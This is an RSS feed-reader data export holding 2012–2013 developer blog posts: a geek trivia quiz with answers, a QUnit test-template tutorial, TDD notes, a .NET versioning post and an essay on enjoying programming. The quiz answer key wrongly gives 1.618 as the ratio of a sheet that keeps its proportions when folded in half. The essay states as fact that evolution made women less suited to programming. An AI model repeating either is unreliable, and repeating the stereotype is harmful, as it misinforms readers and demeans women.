href=\"http://en.wikipedia.org/wiki/Mass%E2%80%93energy_equivalence\">E = mc<sup>2</sup></a>is a constant, the speed of light.</li><li>The next number in the<a href=\"http://en.wikipedia.org/wiki/Fibonacci_number\">Fibonacci</a>sequence 1 1 2 3 5 8 is 13 (5 + 8).</li><li>C<sub>8</sub>H<sub>10</sub>N<sub>4</sub>0<sub>2</sub>is the chemical formula for<a href=\"http://en.wikipedia.org/wiki/Caffeine\">caffeine</a>.</li><li>According to Wikipedia,<a href=\"http://en.wikipedia.org/wiki/Australopithecus\">Australopithecus</a>, the early hominid, became extinct around 2 million years ago.</li><li>You would not find an electron in an<a href=\"http://en.wikipedia.org/wiki/Atomic_nucleus\">atomic nucleus</a>.</li><li>Nitrogen is the most common gas in the<a href=\"http://en.wikipedia.org/wiki/Atmosphere_of_Earth\">Earth’s atmosphere</a>.</li><li>The formula for<a href=\"http://en.wikipedia.org/wiki/Ohm's_law\">Ohm’s Law</a>is I = V/R (current = voltage / resistance).</li><li>A piece of paper that, when folded in half, maintains the ratio between the length of its sides, has sides with a length ratio of 1.618, ‘<a href=\"http://en.wikipedia.org/wiki/Golden_ratio\">the golden ratio</a>’. Did you know that<a href=\"http://en.wikipedia.org/wiki/Golden_ratio#Relationship_to_Fibonacci_sequence\">the ratio between successive Fibonacci sequence numbers also tends to the golden ratio</a>? Maths is awesome!</li><li><a href=\"http://en.wikipedia.org/wiki/Evolution_of_cetaceans\">The closest living land mammal to the cetaceans (including whales) is the Hippopotamus</a>.</li></ol><h3>Space</h3><ol><li>The second (and third) stage of the Apollo Saturn V moon rocket was powered by five<a href=\"http://en.wikipedia.org/wiki/J-2_(rocket_engine)\">J2 rocket engine</a>s.</li><li>Saturn’s largest moon is<a href=\"http://en.wikipedia.org/wiki/Titan_(moon)\">Titan</a>. Also the only moon in the solar system (other than our own) that a spaceship has landed on.</li><li>You would experience<a href=\"http://en.wikipedia.org/wiki/Gravitation_of_the_Moon\">1/6th of the Earth’s gravity on the moon</a>. Or there about.</li><li>This question proved most contentious. The answer is<em>false</em>, there is nowhere in space that has no gravity. Astronauts are weightless because they are in free-fall. Gravity itself is a property of space.</li><li>A<a href=\"http://en.wikipedia.org/wiki/Geosynchronous_orbit\">Geosynchronous</a>spaceship has an orbital period of 24 hours. So it appears to be stationary to a ground observer.</li><li>The furthest planet from the sun is<a href=\"http://en.wikipedia.org/wiki/Neptune\">Neptune</a>. Far fewer people know this, than know that Pluto<em>used to be</em>the furthest planet from the sun. Actually Pluto was only the furthest for part of it’s, irregular, orbit.</li><li>There are currently 6 people aboard the<a href=\"http://www.nasa.gov/mission_pages/station/expeditions/index.html\">International Space Station</a>.</li><li>According to Google (yes, I know) there are 13,000<a href=\"http://www.gearthblog.com/satellites.html\">earth satellites</a>.</li><li><a href=\"http://en.wikipedia.org/wiki/Prospero_(satellite)\">Prospero</a>was the only satellite built and launched by the UK. It was launched by stealth after the programme had been cancelled, that’s the way we do things in the UK.</li><li>The second man on the moon was<a href=\"http://en.wikipedia.org/wiki/Buzz_Aldrin\">Buzz Aldrin</a>. He’s never forgiven NASA.</li></ol><h3>Name That Spaceship!</h3><p><img alt=\"[Name_that_spaceship%255B4%255D.png]\" src=\"http://lh4.ggpht.com/-hGzbsIuQB90/UNRJuMs_n_I/AAAAAAAAF3A/HI6dV7Jr0ic/s1600/Name_that_spaceship%25255B4%25255D.png\" /></p><p>In this round, give yourself a point if you can name the film or TV series the fictional spacecraft appeared in.</p><ol><li><a href=\"http://en.wikipedia.org/wiki/Red_Dwarf\">Red Dwarf</a>. Sorry, you probably have to be British to get this one.</li><li><a href=\"http://en.wikipedia.org/wiki/Space:_1999\">Space 1999</a>. Sorry, you really have to be British<em>and</em>over 40 to get this one … or a major TV space geek.</li><li><a href=\"http://en.wikipedia.org/wiki/Voyager_program\">Voyager</a>. Difficult, interplanetary probes all look similar.</li><li><a href=\"http://en.wikipedia.org/wiki/Apollo_Lunar_Module\">Apollo Lunar Excursion Module</a>(LEM). You can have a point for ‘Lunar Module’, but no, you don’t get a point for ‘Apollo’. Call yourself a geek?</li><li><a href=\"http://en.wikipedia.org/wiki/Skylab\">Skylab</a>. The first US space station, made out of old Apollo parts. Not many people get this one. A read a whole book about it, that’s how much of a space geek I am.</li><li>Darth Vader’s TIE fighter. You can have a point for ‘TIE Fighter’. You can’t have a point for ‘Star Wars’. Yes yes, I know I’m contradicting myself, but, come on,<em>every</em>geek should know this.</li><li><a href=\"http://en.wikipedia.org/wiki/Curiosity_rover\">Curiosity</a>. No, no points for ‘Mars Rover’.</li><li><a href=\"http://en.wikipedia.org/wiki/2001:_A_Space_Odyssey_(film)\">2001 A Space Odyssey</a>. Even I don’t know what the ship is called.</li><li><a href=\"http://en.wikipedia.org/wiki/Soyuz_(spacecraft)\">Soyuz</a>. It’s been used by the Russians to travel into space since 1966. 46 years! It’s almost as old as me. Odd, when space travel is so synonymous with high-technology, that much of the hardware is actually ancient.</li></ol><h3>Geek Culture</h3><ol><li>‘Spooky’ Mulder was the agent in the<a href=\"http://en.wikipedia.org/wiki/The_X-Files\">X-Files</a>, played by actor<a href=\"http://en.wikipedia.org/wiki/David_Duchovny\">David Duchovny</a>.</li><li>Kiki is the<em>trainee witch</em>in ‘<a href=\"http://en.wikipedia.org/wiki/Kiki's_Delivery_Service\">Kiki’s Delivery Service</a>’, one of my favourite anime movies by the outstanding<a href=\"http://en.wikipedia.org/wiki/Studio_Ghibli\">Studio Ghibli</a>.</li><li>The actual quote: “<a href=\"http://www.youtube.com/watch?v=IM1-DQ2Wo_w\">Humans are a disease</a>, a cancer of this planet.” by Agent Smith. You can have a point for Virus or Cancer too. Thanks Chris for the link and clarification.</li><li>Spiderman of course!</li><li>“It’s a Banana”<a href=\"http://www.youtube.com/watch?v=oB-NnVpvQ78\">Kryten, of Red Dwarf, learns to lie</a>.</li><li>My wife, who is Japanese, translates ‘<a href=\"http://en.wikipedia.org/wiki/Otaku\">Otaku</a>’ as ‘geek’. Literally it means ‘you’ and is used to describe someone with obsessive interests. An appropriate question for a geek quiz I think.</li><li>The name<a href=\"http://en.wikipedia.org/wiki/R2-D2\">R2D2</a>  apparently came about when Lucas heard someone ask for Reel 2 Dialog Track 2 in the abbreviated form ‘R-2-D-2’. Later it was said to stand for Second Generation Robotic Droid Series 2, you can have a point for either.</li><li><a href=\"http://en.wikipedia.org/wiki/Clarke's_three_laws\">Clarke’s 3rd law</a>states: “Any sufficiently advanced technology is indistinguishable from magic.”</li><li><a href=\"http://www.youtube.com/watch?v=4b4bGAoVR7g\">African or European</a>? From Monty Python’s Holy Grail.</li><li><a href=\"http://www.youtube.com/watch?v=dSIKBliboIo\">Open the pod bay doors please HAL</a>. 2001 A Space Odyssey.<a href=\"http://www.youtube.com/watch?v=3_CZswausC4\">Or on acid here</a>.</li></ol><p>So there you are. I hope you enjoyed it, and maybe even learnt a little. I certainly did. I might even do it again next year.</p><p>A very Merry Christmas to you all!</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":1012}}
{"k":"0000000084","o":"0000004807","v":"001"}
{"_id":1013,"_uid":1013,"_dt":1373741607088,"_s":"4a3db95b7797b738c8bfe828bdb5ee8b"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/bQgPcXJnIoY/a-geek-christmas-quiz.html","title":"A Geek Christmas Quiz","published":{"$wrap":"$date","v":1356089760000,"h":"2012-12-21T11:36:00.000Z"},"starred":false,"read":false,"content":"<p>God rest ye merry gentlemen! Welcome to my 2012 Geek Christmas Quiz. Every Friday morning at 15below we have a ‘DevEd’ session. Usually this is a presentation about some interesting tech, or a new way we want to do something at the company, but today I thought I would try to gauge the true geekiness of our development team with a quiz. The winners, and therefore crowned top geeks, were Toby and Linda who got a total of 32 points. See if you can do better dear reader.</p><p>You get one point for each correct answer. The quiz is split into six sections:  Computers, ‘Name That Geek’, Science, Space, ‘Name That Spaceship’, and Geek Culture.</p><p><strong>Update:</strong>The answers are<a href=\"http://mikehadlow.blogspot.co.uk/2012/12/a-geek-christmas-quizthe-answers.html\">here</a>.</p><h3>Computers</h3><ol><li>What does G.N.U. stand for?</li><li>What did the A in ARM originally stand for?</li><li>What does TCP stand for?</li><li>Who founded Microsoft with Bill Gates?</li><li>What is F2 (hexadecimal) in decimal?</li><li>Which operating system's development was based on the 'Balmer Peak'?</li><li>Who was the first programmer?</li><li>What year does UNIX time start?</li><li>What did SGI stand for?</li><li>Write down the type signature of the Monadic Bind method.</li></ol><h3>Name that Geek</h3><p><a href=\"http://lh4.ggpht.com/-9dCdTenpfew/UNRJrz8wCHI/AAAAAAAAF20/F-jPxSUS0CE/s1600-h/Name_that_geek%25255B4%25255D.png\"><img style=\"background-image: none; border-right-width: 0px; padding-left: 0px; padding-right: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px; padding-top: 0px\" title=\"Name_that_geek\" border=\"0\" alt=\"Name_that_geek\" src=\"http://lh5.ggpht.com/-vPUctn60PDk/UNRJtJxs9GI/AAAAAAAAF24/7OrNbQ9DE7A/Name_that_geek_thumb%25255B2%25255D.png?imgmax=800\" width=\"800\" height=\"600\" /></a></p><h3>Science</h3><ol><li>What are the four letters of DNA?</li><li>What does the 'c' in E = mc2 stand for?</li><li>What is the next number in this sequence: 1 1 2 3 5 8 _ ?</li><li>What is C8 H10 N4 02 ?</li><li>When did Australopithecus become extinct? (in millions of years ago)</li><li>Which of the following would you<em>not</em>expect to find in an atomic nucleus (electron, neutron, proton)</li><li>What is the most common gas in the Earth's atmosphere?</li><li>Write the formula for Ohm's law.</li><li>If, after you fold a piece of paper in half, the ratio between its longest side and its shortest side is the same, what is that ratio?</li><li>What living land mammal is the closest evolutionary relative to Whales? (cetaceans)</li></ol><h3>Space</h3><ol><li>What rocket engine powered the 2nd stage of the Saturn V?</li><li>What is Saturn's largest moon?</li><li>What fraction of the Earth's gravity would you experience on the moon?</li><li>Astronauts are weightless in space because there is no gravity. true or false?</li><li>What is the orbital period of a geosynchronous satellite?</li><li>What is the furthest planet from the sun? (now that Pluto has been demoted)</li><li>How many people are currently living aboard the ISS?</li><li>To the nearest thousand, how many satellites are currently orbiting the earth?</li><li>What was the name of the only satellite launched by the UK?</li><li>Who was the second man on the moon?</li></ol><h3>Name that spaceship</h3><p><a href=\"http://lh4.ggpht.com/-hGzbsIuQB90/UNRJuMs_n_I/AAAAAAAAF3A/HI6dV7Jr0ic/s1600-h/Name_that_spaceship%25255B4%25255D.png\"><img style=\"background-image: none; border-right-width: 0px; padding-left: 0px; padding-right: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px; padding-top: 0px\" title=\"Name_that_spaceship\" border=\"0\" alt=\"Name_that_spaceship\" src=\"http://lh6.ggpht.com/-sllcHIZrXC4/UNRJuxcyovI/AAAAAAAAF3I/fLMIC3BhDnI/Name_that_spaceship_thumb%25255B2%25255D.png?imgmax=800\" width=\"800\" height=\"600\" /></a></p><h3>Geek Culture</h3><ol><li>Who was Spooky Mulder?</li><li>Was Kiki a trainee witch or an evil princes?</li><li>\"Humans are a _____\" (Agent Smith)</li><li>Who is Peter Parker?</li><li>\"It's a b... It's a b... It's a small, off-duty Czechoslovakian traffic warden!\" What is it really?</li><li>What does 'Otaku' (Japanese) mean?</li><li>What does R2D2 stand for?</li><li>What is Clarke's 3rd law?</li><li>What is the air speed velocity of an unladen swallow?</li><li>Open ___ ___ ___ ____ please H.A.L</li></ol>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":1013}}
{"k":"0000000084","o":"0000005097","v":"001"}
{"_id":1014,"_uid":1014,"_dt":1373741607088,"_s":"ca930c9ec3308512c4e784a49345f8d8"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/J5gA2s73tf8/","title":"A simple jQuery Qunit-based JavaScript Unit Test Project Template","published":{"$wrap":"$date","v":1373035019000,"h":"2013-07-05T14:36:59.000Z"},"starred":false,"read":false,"content":"<p>Next week, I’m giving a talk on JavaScript Unit Testing at <a href=\"http://www.codestock.org\" target=\"_blank\">Codestock</a>. I think this is my 5th year. Always a great show and am looking forward to seeing everyone in Knoxville, TN. The talk is going to be divided into 3 parts: 1 – recognizing and implementing testable JavaScript code, 2 – JavaScript Unit Testing fundamentals and 3 – Visual Studio integration. It is the 3rd part that I want to discuss right now. I’ve just uploaded <a href=\"http://visualstudiogallery.msdn.microsoft.com/5bb449d7-4e9b-418a-8d96-0ee77d87eecb\" target=\"_blank\">a new JavaScript unit test project template</a> to the <a href=\"http://visualstudiogallery.msdn.microsoft.com/\" target=\"_blank\">Visual Studio Gallery</a>.</p><p><a href=\"http://codebetter.com/johnvpetersen/files/2013/07/js_testing_icon.png\"><img src=\"http://codebetter.com/johnvpetersen/files/2013/07/js_testing_icon.png\" alt=\"js_testing_icon\" width=\"48\" height=\"48\" class=\"alignleft size-full wp-image-607\" /></a></p><p>There is a need for a simple unit test project that is devoted to JavaScript unit testing. For this template, I chose the jQuery QUnit project. To make full use of the template, you will also need the <a href=\"http://visualstudiogallery.msdn.microsoft.com/f8741f04-bae4-4900-81c7-7c9bfb9ed1fe\" target=\"_blank\">Chutzpah JavaScript Unit Test Runner</a> installed. Chutzpah integrates your JavaScript Unit tests.</p><p>Once the extension is installed, the add-in will be available:</p><p>(Yes, I know the project type reads as Visual C#… When I created the template, I decided to start with a class library project – like any other unit test project. I could have hosted this in a Windows Store JavaScript project – but that would have left folks out that have not upgraded to Windows 8 yet. )</p><p><a href=\"http://codebetter.com/johnvpetersen/files/2013/07/image0.png\"><img class=\"alignleft size-full wp-image-600\" alt=\"image0\" src=\"http://codebetter.com/johnvpetersen/files/2013/07/image0.png\" width=\"519\" height=\"417\" /></a></p><p>To get up and running, I added a simple Hello World QUnit JavaScript unit test. The following example shows the template in action:</p><p>Consider the following solution structure:</p><p><a href=\"http://codebetter.com/johnvpetersen/files/2013/07/image1.png\"><img class=\"alignleft size-full wp-image-594\" alt=\"image1\" src=\"http://codebetter.com/johnvpetersen/files/2013/07/image1.png\" width=\"501\" height=\"382\" /></a></p><p>This solution has 3 projects: ASP.NET MVC, MVC Unit Test and a JavaScript Unit Test Project. To illustrate how to put your web project’s js code under test, I created a myFunctionTests.js file -  which corresponds to the myFunctions.js file in the UnitTesting.Web MVC Project. Here is the code for myFunction.js:</p><pre class=\"brush: jscript; title: ; notranslate\" title=\"\">var myFunctions = (function () {var _functions = {};_functions.add = function (items) {var total = 0;for (var i in items){total += items[i];}return total;};return _functions;}());</pre><p>A very simple function that takes an array of numbers and adds them together. Here’s the test in the JavaScript Unit Test Project:<br />(Take note of how to reference the js file that hosts the function under test.)</p><pre class=\"brush: jscript; title: ; notranslate\" title=\"\">/// &lt;reference path=\"../../../unittesting.web/scripts/myfunctions.js\" /&gt;test(\"My Function Add Test\", function () {var result = myFunctions.add([1, 2, 3]);var expected = 6;ok(result == expected, \"Result: \" + result  + \", expected: \" + expected);});</pre><p>In addition, there is also a standard unit test project which was added when the MVC project was created. The following figure shows the Visual Studio Test Explorer running all of our tests (in my Test Explorer settings, I’ve opted to organize the tests by project):</p><p><a href=\"http://codebetter.com/johnvpetersen/files/2013/07/image2.png\"><img class=\"alignleft size-full wp-image-597\" alt=\"image2\" src=\"http://codebetter.com/johnvpetersen/files/2013/07/image2.png\" width=\"699\" height=\"382\" /></a></p><p>If I was to alter the test by changing the expected value to 5 and saved the file, the affected tests will run again. The following figure shows our unit test in a failed state:</p><p><a href=\"http://codebetter.com/johnvpetersen/files/2013/07/image3.png\"><img class=\"alignleft size-full wp-image-599\" alt=\"image3\" src=\"http://codebetter.com/johnvpetersen/files/2013/07/image3.png\" width=\"702\" height=\"588\" /></a></p><p> </p><p>Enjoy!!</p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/J5gA2s73tf8\" height=\"1\" width=\"1\"/>","author":"johnvpetersen","_id":{"$wrap":"$oid","v":1014}}
{"k":"0000000084","o":"0000001859","v":"001"}
{"_id":1015,"_uid":1015,"_dt":1373741607088,"_s":"42d934897f50aab5c45ba90d084cbb7e"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/m6J2hJh8pqg/","title":"TDD I Learned… Code Katas","published":{"$wrap":"$date","v":1370536295000,"h":"2013-06-06T16:31:35.000Z"},"starred":false,"read":false,"content":"<p>Continuing to make my way through <a href=\"https://www.udemy.com/tdd-in-net-with-roy-osherove/\">Roy Osherove’s TDD course</a>.  There’s an interesting exercise that he introduces to help practice and gain the muscle memory required to do TDD well – the Code Kata.  <a href=\"http://en.wikipedia.org/wiki/Kata_(programming)\">Wikipedia</a> attributes the code kata to Dave Thomas:</p><blockquote><p><b>Code Kata</b> is a term coined by <a title=\"Dave Thomas (programmer)\" href=\"http://en.wikipedia.org/wiki/Dave_Thomas_(programmer)\">Dave Thomas</a>, co-author of the book <i><a title=\"The Pragmatic Programmer\" href=\"http://en.wikipedia.org/wiki/The_Pragmatic_Programmer\">The Pragmatic Programmer</a></i>, in a bow to the Japanese concept of <a title=\"Kata (martial arts)\" href=\"http://en.wikipedia.org/wiki/Kata_(martial_arts)\">kata</a> in the martial arts. A code kata is an exercise in programming which helps a programmer hone their skills through practice and repetition.</p></blockquote><p>There’s <a href=\"https://github.com/garora/TDD-Katas\">a nice project over here</a> on Github containing descriptions and code for a bunch of Katas, including the string calculator  that Roy introduces. Roy’s site has <a href=\"http://osherove.com/tdd-kata-1/\">the string calculator kata executed in a bunch of different languages</a>, including <a href=\"http://www.autohotkey.com/\">AutoHotkey</a>!</p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/m6J2hJh8pqg\" height=\"1\" width=\"1\"/>","author":"Brendan Tompkins","_id":{"$wrap":"$oid","v":1015}}
{"k":"0000000084","o":"0000001833","v":"001"}
{"_id":1016,"_uid":1016,"_dt":1373741607088,"_s":"b3ca1f6c4fc729d29a0e26d7f9ed7cdb"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/trS4gOju9Ro/","title":".Net framework versions and dll hell","published":{"$wrap":"$date","v":1370427768000,"h":"2013-06-05T10:22:48.000Z"},"starred":false,"read":false,"content":"<p>With .net version numbers increasing and increasing I recently encountered something which reminded me of <a href=\"http://en.wikipedia.org/wiki/DLL_Hell\">dllhell</a>. Which the .net framework promised to end. The nice part is that it already shows up at build time. Not at run time, leading to disappointed customers. Framework versions can be mixed in one solution. Up to the moment one assembly references another assembly built against a higher version. At this moment the VS build process starts to lose track.</p><p>The catch is that it’s not always clear you’re mixing framework versions in a solution. Adding a new project will default against the newest framework version. Which is not constant over a solution’s life time. The result can be quite strange. I managed to get away with a circular reference which was not seen because one project was using a version of the other built against an older framework version. And was thus considered a different assembly. Up to the moment I checked the framework version of all projects.</p><p>The only good way to solve this descend into hell would be having all projects in the solution on one version. In a big solution with a lot of projects this can be quite tedious. I would love to be able to set the version on the solution level. Or else to have a nice ‘refactoring’ tool to the work for me. R# are you listening ?</p><p> </p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/trS4gOju9Ro\" height=\"1\" width=\"1\"/>","author":"Peter van Ooijen","_id":{"$wrap":"$oid","v":1016}}
{"k":"0000000084","o":"0000004059","v":"001"}
{"_id":1017,"_uid":1017,"_dt":1373741607089,"_s":"0c9e9aed8c05d667998f98e2af59f944"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/GRe-6Cd29AU/","title":"TDD I Learned…","published":{"$wrap":"$date","v":1369403118000,"h":"2013-05-24T13:45:18.000Z"},"starred":false,"read":false,"content":"<p>A few weeks ago, <a href=\"http://osherove.com/\">Roy Osherove</a> <a href=\"https://go.madmimi.com/redirects/1363545594-b74e8b07eb6aa688a66bdc9837564a54-5a302e6?pa=381768481047987771\" target=\"_blank\">released his full TDD master class in .NET available a video series of over nine hours, recorded live in class</a>.</p><p>I’m a TDD wannabe.  I’ve done small tasks using TDD, and I’ve written plenty of tests, but most just get shuffled around, never included in my CI builds, and basically the entire thing is a mess…  Perhaps it’s because I’ve been <a href=\"http://codebetter.com/gregyoung/2013/03/06/startups-and-tdd/\">writing code for startups</a>, but most likely it’s because I’ve just not taken the time to learn the right way.  I’ve never truly seen the benefits that it can bring.  So I saw this class as a great chance to learn from the master.</p><p>I’m going to blog about my experiences going through this course.  I’ve been through the first two hours, and so far I really like the pace and Roy’s teaching style.  Roy is snarky-funny, and so the content is entertaining to boot.</p><p>So here are some of the more interesting things that I’ve learned from the course so far…</p><p><strong>Difference between Integration Tests and Unit Tests</strong></p><p>Although the generally <a href=\"http://stackoverflow.com/questions/10752/what-is-the-difference-between-integration-and-unit-tests\">accepted definition of the difference may be up to some debate</a>, Roy’s definition is simple, I like it, and it’s useful for me.  Roy says that a unit test is all in memory.  It should pass on any new developer’s machine, and is not tied to disk, databases or anything outside of the memory scope of the test.  This is important because confidence in your unit tests is paramount.  If you cannot trust that a failing test is due to a bug, i.e. if it’s due to some setup on disk, etc. it diminishes the usefulness of your test suite and developers cannot quickly setup to work on a codebase.</p><p><strong>Arrange, Act, Assert</strong></p><p>The three A’s of unit testing was new to me, and  <a href=\"http://c2.com/cgi/wiki?ArrangeActAssert\">is a pattern</a> for writing tests that Roy introduces:</p><blockquote><p>Each method should group these functional sections, separated by blank lines:</p><ol><li><strong>Arrange</strong> all necessary preconditions and inputs.</li><li><strong>Act</strong> on the object or method under test.</li><li><strong>Assert</strong> that the expected results have occurred.</li></ol></blockquote><p><span style=\"font-size: 16px;\">This approach, by eliminating assert code intermixed with code that sets up or acts upon your objects, reduces smelly tests by separating what is being tested from all the other stuff.  See, I need stuff like this to help me fall into a pit of success of testing.  </span></p><p>There’s a lot of good stuff in there about creating readable and maintainable tests.  Roy also delves into best practices for naming tests, offers some good hints on how to setup Resharper live templates, a good deal of information on why he prefers <a href=\"http://www.testdriven.net/\">TestDriven.Net</a> as a test runner (and how to use it to debug methods directly!) including an interesting history lesson on <a href=\"http://jameskovacs.com/2007/05/31/microsoft-vs-jamie-cansdale/\">MSFT vs  TestDriven.Net’s Jamie Cansdale</a>.</p><p>W<span style=\"font-size: 16px;\">ith over nine hours of course total, I’m expecting to learn a lot.  Oh, and apparently serial killers practice TDD.  :)</span></p><p>-Brendan</p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/GRe-6Cd29AU\" height=\"1\" width=\"1\"/>","author":"Brendan Tompkins","_id":{"$wrap":"$oid","v":1017}}
{"k":"0000000084","o":"0000009708","v":"001"}
{"_id":1018,"_uid":1018,"_dt":1373741607089,"_s":"37c8a2b862965707c664d1e63775f75b"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/WUQ4mwi7myE/","title":"The joy of being a programmer","published":{"$wrap":"$date","v":1368799485000,"h":"2013-05-17T14:04:45.000Z"},"starred":false,"read":false,"content":"<p>I am programming since I am 10 and I am now 38. Today I measure how much good programming bring to my life, directly and indirectly. I’d like to give credit to aspects I love in my job. Hopefully some young people will read this and will consider maybe doing one of the most wonderful job on earth.</p><p><strong>Getting in the flow:</strong> According to <a href=\"http://en.wikipedia.org/wiki/Flow_(psychology)\" target=\"_blank\">wikipedia</a>, <em>flow is the mental state of operation in which a person performing an activity is fully immersed in a feeling of energized focus, full involvement, and enjoyment in the process of the activity. In essence, flow is characterized by complete absorption in what one does</em>. Focus, immersion, being concentrated, involvement …  being everyday in the flow by coding hours and hours, contribute a lot to a solid positive state of mind, it is a bit like meditation.  These are moments where one can completely forget about minor everyday pesky stuff, but also forget for a while more serious problem in life everyone has to face. Being in the flow is the condition to solve challenging problems and to create beautiful pieces of engineering. Being in the flow can lead to addiction but it is not addiction. This is essential to control when to check-in in the flow and when check-out, making sure to not be disturbed meantime.</p><p><strong>Being creative:</strong> Being a software engineer is one of the most mainstream way of being paid for being creative. Often, writing software is deemed to be an artistic activity. A programmer has to be humble, because this is a kind of art not understood by the mass. But being humble is a chance to become wiser and increase self-confidence. Also, knowing you are going to be creative for a while, is an excellent motivation to overcome the first step effort to jump in the flow. But the truth is that for every passionate programmer, there is a background thread in the mind in charge of creativity (often running at sleep-time), that makes it so that in the morning the envy to create what you have in mind is too strong.</p><p><strong>Becoming an expert:</strong> It is common to hear that a programmer must know numerous technologies, that its skill is to learn how to learn new technologies. On this I disagree because what makes me really happy is to master completely a technology and exercise daily my expertise. I used to master all the tricky details of C++ and COM and it was fun. Before that I used to master some assembly level programming and it was fun, I was not even getting paid for <a href=\"http://en.wikipedia.org/wiki/Amiga_demos\" target=\"_blank\">that</a>. In 2002/2003 and then  2005 I wrote two editions of a <a href=\"http://www.amazon.fr/Pratique-NET-2-0-C/dp/2841773396\" target=\"_blank\">1.000 pages book on .NET and C#</a> and writing it has been one of the most blessed moment in my career. Since then I capitalize on this knowledge every single hour of coding, letting me focus my thoughts on problems to solve, and not on all the non-trivial things a complex platform like .NET is actually performing under my feet. Of course I am constantly discovering new details about surrounding technologies, like functional programming paradigms through the prism of functional paradigm introduced in .NET languages. But I know what is my core knowledge, both in terms of technologies and in term of program design skills. And as long as I won’t be forced to change my core skills, relying on my expertise to express my creativity and making a living on top of it is a source of personal achievement.</p><p><strong>Meet inspiring people sharing the same passion:</strong> I imagine meeting peers is a source of happiness for every expert in something. This is also why investing in a solid programming particular set of skills is a positive thing. Not only respect from others programmers arise, but it lets have great exchange with smart people as passionate as you. The importance of flow, underlined above, also comes with the disadvantage of being often alone with your thoughts. Most programmers enjoy working alone anyway, but for those who need a bit of more social activity, having an expertise in something is also a great way to become <em>partly</em> a teacher (in professional or academic spheres), <em>partly</em> an architect and contribute to important decisions, <em>partly</em> a team-leader and be responsible for project progressing, <em>partly</em> a consultant, and be able to share your knowledge in a pleasant social environment. I put the word <em>partly</em> in italic because if your social activity make it so that you are not writing code meant to be run in production anymore, you shouldn’t consider you as a programmer anymore and you’ll loose a great deal of the points I am mentioning here. If you need social interactions all day long, programming is not for you. This is also why (sadly) there are so few women in software, because <a href=\"http://en.wikipedia.org/wiki/Evolutionary_psychology\" target=\"_blank\">evolution</a> designed them to be much more social beings than men.</p><p><strong>Being involved in something that make sense:</strong> Here also my position might be a bit different of what is widely accepted. I agree that for juniors, it is important to multiply the opportunities to work in several different teams and companies, to get an idea of what they like and what they don’t, to be influenced by several inspiring mentors. But once you become seniors, working on the same application in the long term, where you feel well programming in,  polishing it days after days, seeing its evolution across years, maintaining it in a clean state by adopting modern paradigms like automatic tests, DbC or relentless refactoring, having your word to say about strategic decisions, personally I found this being a great source of daily happiness and a great motivation to involve myself! In addition, working hard to achieving important milestones regularly, is an excellent way to give a sense to your professional career, which is (much) more the exception than the rule.</p><p><strong>Work wherever, whenever you like:</strong> A 2KG laptop with the proper tools set installed, a few hours of electricity every 24 hours, this is all what a programmer needs to do his job well. A descent internet connection is often appreciated, and there are today only few points on earth where internet is not available at all somehow. Programming might be probably the less demanding working activity in terms of time and space requirement. Getting in a flow in a 12 hours plane flying across the planet, scheduling half a year to live and work in a <a href=\"http://www.youtube.com/watch?v=-a2jugsYQXM\" target=\"_blank\">paradise tropical island</a>, avoiding traffic jam by staying at home for work (in your pijama), delaying programming in the night or early morning to take care of the kids and their education, all this is not only possible but pretty common actually. Most serious software companies let some of their skilled engineers work wherever they prefer. Did you know that many of the great minds behind Visual Studio didn’t actually moved with their family to Seattle, but still live in their preferred location, sometime far away from the US?</p><p><strong>Make a decent living doing something you like: </strong>Last but not least, everywhere, skilled programmers get paid above the average salary in their countries, and if we take the example of a developing country like India, good programmers get a much much higher income than the average. On top of that, a skilled programmer have pretty close to zero chances to remain unemployed for a long time. This also means that if you don’t like your current position, it is easy to find another better suited one. This situation is made possible because less than two decades ago, the modern civilization realized that IT is the condition for its development. It is a fact that many of the richest persons in the world were originally programmers and every motivated programmer has the potential to create <a href=\"http://www.ndepend.com/\" target=\"_blank\">its own ISV business</a>. A programmer can also decide to make more money by coding for the financial industry, or even bet on a startup and potentially makes millions in a few years.</p><p>All the next big things will consume even more IT, this includes human genome analysis for the mass, the entire medicine that will be deeply impacted by that, more prevalent portable devices, more sophisticated entertainments, augmented reality, robots and automated machines to do surgery, to assist the increasing growing number of old people, artificial intelligence in the long term, and certainly everything nobody hasn’t imagined yet. After all 20 years ago, nobody anticipated the impact of Google. 10 years ago nobody anticipated the impact of Facebook and smart phones.</p><p>Ok enough getting in the flow of writing my passion for programming, I have some code to write before the weekend <img src='http://codebetter.com/patricksmacchia/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /> </p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/WUQ4mwi7myE\" height=\"1\" width=\"1\"/>","author":"Patrick Smacchia","_id":{"$wrap":"$oid","v":1018}}
{"k":"0000000084","o":"0000006004","v":"001"}
{"_id":1019,"_uid":1019,"_dt":1373741607089,"_s":"01b10d2e752414b314b514b94e55e6b8"}
